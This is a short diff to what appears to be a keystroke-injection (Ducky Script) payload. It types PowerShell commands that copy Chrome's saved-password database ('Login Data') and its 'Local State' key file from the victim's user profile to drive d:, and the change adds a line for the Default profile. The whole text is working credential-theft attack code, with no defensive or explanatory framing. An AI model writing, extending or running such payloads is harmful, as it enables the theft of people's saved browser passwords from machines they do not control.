@@ -10,6 +10,9 @@ DELAY 1000
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "d:\$env:UserName\"
 ENTER
 DELAY 1000
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Destination "d:\$env:UserName\"
+ENTER
+DELAY 1000
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
 ENTER
 DELAY 5000
